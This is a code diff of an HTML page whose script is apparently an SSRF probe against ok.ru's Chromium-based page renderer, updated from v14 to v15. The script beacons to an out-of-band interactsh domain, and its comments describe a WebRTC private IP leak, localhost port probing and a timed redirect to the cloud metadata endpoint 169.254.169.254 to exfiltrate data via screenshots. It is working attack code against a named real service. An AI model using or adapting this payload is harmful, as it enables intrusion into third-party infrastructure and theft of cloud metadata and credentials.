@@ -4,7 +4,7 @@
 <body>
 <script>
 'use strict';
-// ok.ru Chromium SSRF — probe v14
+// ok.ru Chromium SSRF — probe v15
 // NEW vs v13:
 // - Updated OOB domain (new interactsh session)
 // - WebRTC local IP leak (bypasses PNA — reveals private IP if any)
@@ -12,7 +12,7 @@
 // - 127.0.0.1 port probe via form submit (form navigations bypass PNA)
 // - Top-level navigate to IMDS at t=8s for screenshot exfil
 
-const OOB = 'd8v8aub6b8ma1b7u3dc0iozf3edhp4e5k.oast.pro';
+const OOB = 'd9mjmj36b8mf9c7q1kq06nymp331ewo86.oast.pro';
 
 const clean = s => String(s).toLowerCase().replace(/[^a-z0-9-]/g,'-').replace(/-+/g,'-').replace(/^-|-$/g,'').slice(0,58);
 const oob = label => {
@@ -21,7 +21,7 @@ const oob = label => {
   fetch(`http://${l}.${OOB}/`, {mode:'no-cors', signal:AbortSignal.timeout(3000)}).catch(()=>{});
 };
 
-oob('v14-s');
+oob('v15-s');
 
 // ── Phase 1: WebRTC private IP leak (bypasses PNA entirely) ───────────────
 try {
@@ -91,12 +91,12 @@ setTimeout(() => {
 
 // ── Phase 4: Navigate to IMDS for screenshot exfil ───────────────────────
 setTimeout(() => {
-  oob('v14-nav-imds');
+  oob('v15-nav-imds');
   // YC/GCP metadata endpoint (most likely for VK infrastructure on Yandex Cloud)
   window.location.href = 'http://169.254.169.254/computeMetadata/v1/?recursive=true&alt=json';
 }, 8000);
 
-oob('v14-setup-done');
+oob('v15-setup-done');
 </script>
 </body>
 </html>
